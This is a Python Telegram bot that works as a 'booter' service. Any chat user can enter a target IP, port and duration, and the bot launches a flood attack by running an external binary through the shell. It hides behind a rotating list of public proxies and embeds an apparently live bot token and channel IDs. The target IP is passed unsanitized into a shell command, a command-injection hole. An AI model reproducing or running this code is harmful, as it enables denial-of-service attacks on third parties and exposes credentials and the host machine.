import os
import telebot
import json
import requests
import logging
import time
from datetime import datetime, timedelta
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '7532967183:AAF1DMRNjCUetiNRdgACEh8RGtkcBQfaKvE'
FORWARD_CHANNEL_ID = -1002241427670
CHANNEL_ID = -1002241427670
error_channel_id = -1002241427670

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 10")
    await process.communicate()
    bot.attack_in_progress = False

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        # No longer using MongoDB for approval
        if bot.attack_in_progress:
            bot.send_message(chat_id, "*⚠️ Please wait!*\n"
                                       "*The bot is busy with another attack.*\n"
                                       "*Check remaining time with the /when command.*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"  
                                   "*Please provide the target IP, port, and duration in seconds.*\n"
                                   "*Example: 167.67.25 6296 1800* 🔥\n"  
                                   "*Let the chaos begin! 🎉*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"  
                                               "*Please use the correct format and try again.*\n"  
                                               "*Make sure to provide all three inputs! 🔄*", parse_mode='Markdown')  
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"
                                               "*Please select a different port to proceed.*", parse_mode='Markdown')  
            return
        if duration > 1800:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 1800 seconds (30 minutes).* \n"
                                               "*Please shorten the duration and try again!*", parse_mode='Markdown')  
            return

        # Start the attack asynchronously
        bot.attack_in_progress = True
        bot.send_message(message.chat.id, f"*🚀 Attack started! Target: {target_ip}:{target_port} for {duration} seconds.*", parse_mode='Markdown')
        
        asyncio.run(run_attack_command_async(target_ip, target_port, duration))

    except Exception as e:
        bot.send_message(message.chat.id, "*❗ Error occurred during attack setup.*", parse_mode='Markdown')
        logging.error(f"Error processing attack: {e}")

@bot.message_handler(commands=['when'])
def check_attack_status(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        bot.send_message(chat_id, "*⚠️ Attack is in progress!*\n"
                                   "*Please wait until it finishes!*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*✅ No active attacks currently!*")

if __name__ == '__main__':
    bot.attack_in_progress = False
    bot.infinity_polling()
